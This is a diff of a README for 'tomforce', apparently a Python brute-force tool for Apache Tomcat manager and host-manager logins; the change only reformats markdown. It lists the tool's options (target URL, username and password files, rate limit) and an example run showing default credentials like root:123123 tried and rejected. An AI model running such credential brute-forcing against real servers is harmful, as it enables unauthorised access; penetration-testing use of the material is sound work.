@@ -2,23 +2,26 @@
 
 # Usage
 
-`git clone https://github.com/v1ru6/tomforce.git  `
-`pip install termcolor  `
+`git clone https://github.com/v1ru6/tomforce.git`  
+`pip install termcolor`  
 
-`python3 tomforce.py  `
+`python3 tomforce.py`  
 
+```bash
 options:  
 
--h, --help                              show this help message and exit  
--U URL, --url URL                       Base URL to the Tomcat page (e.g., http://target.com)  
--P PATH, --path PATH                    Manager or host-manager URI (e.g., /host-manager/html)  
--u USERNAMES, --usernames USERNAMES     Path to file containing usernames  
--p PASSWORDS, --passwords PASSWORDS     Path to file containing passwords  
--v, --verbose                           Enable verbose output to see attempted credentials and encoded values  
--r RATE_LIMIT, --rate-limit RATE_LIMIT  Delay in seconds between requests (e.g., 0.5 for half a second)  
+-h, --help                              show this help message and exit
+-U URL, --url URL                       Base URL to the Tomcat page (e.g., http://target.com)
+-P PATH, --path PATH                    Manager or host-manager URI (e.g., /host-manager/html)
+-u USERNAMES, --usernames USERNAMES     Path to file containing usernames
+-p PASSWORDS, --passwords PASSWORDS     Path to file containing passwords
+-v, --verbose                           Enable verbose output to see attempted credentials and encoded values
+-r RATE_LIMIT, --rate-limit RATE_LIMIT  Delay in seconds between requests (e.g., 0.5 for half a second)
+```
                         
 # Example
 
+```bash
 python3 tomforce.py -U https://example.com -P /host-manager -u usernames.txt -p passwords.txt -v
 
 [\+] Starting Brute-force Attack...                                                                        
@@ -37,3 +40,4 @@ python3 tomforce.py -U https://example.com -P /host-manager -u usernames.txt -p 
 [\*] Trying root:123123 → Encoded: cm9vdDoxMjMxMjM= → HTTP 401                                                                
 [\*] Trying root:111111 → Encoded: cm9vdDoxMTExMTE= → HTTP 401                                                                
 [\*] Trying root:Password → Encoded: cm9vdDpQYXNzd29yZA== → HTTP 401
+```
